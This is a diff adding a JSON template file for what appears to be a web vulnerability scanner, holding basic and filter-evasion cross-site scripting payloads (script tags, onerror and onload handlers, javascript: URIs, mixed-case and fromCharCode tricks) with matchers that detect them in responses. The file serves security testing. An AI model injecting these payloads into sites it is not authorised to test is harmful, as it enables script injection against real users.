@@ -1,0 +1,103 @@
+[
+  {
+    "id": "xss-basic",
+    "info": {
+      "name": "XSS - Basic Cross-Site Scripting",
+      "severity": "high",
+      "category": "injection",
+      "description": "Tests for basic reflected XSS vulnerabilities using common JavaScript injection patterns",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+      ],
+      "tags": [
+        "xss",
+        "injection",
+        "client-side"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "<script>alert('XSS')</script>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<img src=x onerror=alert(1)>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<svg/onload=alert('XSS')>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "javascript:alert(1)",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<iframe src=javascript:alert('XSS')>",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "<script>alert",
+          "onerror=",
+          "onload=",
+          "javascript:alert"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "xss-advanced",
+    "info": {
+      "name": "XSS - Advanced Evasion Techniques",
+      "severity": "high",
+      "category": "injection",
+      "description": "Advanced XSS payloads with encoding and obfuscation",
+      "references": [
+        "https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
+      ],
+      "tags": [
+        "xss",
+        "injection",
+        "evasion"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "<ScRiPt>alert(1)</sCrIpT>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<img src=x onerror=\"alert(1)\">",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "';alert(String.fromCharCode(88,83,83))//",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "alert(1)",
+          "String.fromCharCode"
+        ]
+      }
+    ]
+  }
+]
